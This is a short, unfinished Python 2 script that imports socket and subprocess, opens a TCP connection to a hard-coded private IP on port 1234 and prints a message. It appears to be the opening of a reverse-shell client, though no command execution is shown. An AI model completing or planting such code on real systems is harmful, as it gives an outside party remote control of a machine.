import socket
import os
import subprocess

import socket, subprocess, sys, os

hote = "10.101.200.38"
port = 1234

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((hote, port))
print "Connection on {}".format(port)

   

